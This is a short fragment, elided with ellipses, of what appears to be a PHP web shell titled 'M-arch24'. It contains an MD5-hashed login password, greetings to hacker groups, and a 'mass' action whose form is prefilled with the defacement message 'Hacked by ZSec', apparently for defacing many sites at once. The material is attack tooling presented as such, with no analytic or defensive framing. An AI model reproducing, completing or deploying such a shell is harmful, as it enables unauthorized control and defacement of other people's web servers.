...
$password = "285F50029090AF5DE63C79700C4C4565"; # md5: M-arch24
...
// Greetz: All Mem CoiZter_Team.
###############################################################################
// Special Thanks: XEIT_Cyber
###############################################################################
-->
<head>
<title>M-arch24</title>
		...
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by ZSec</textarea><br>
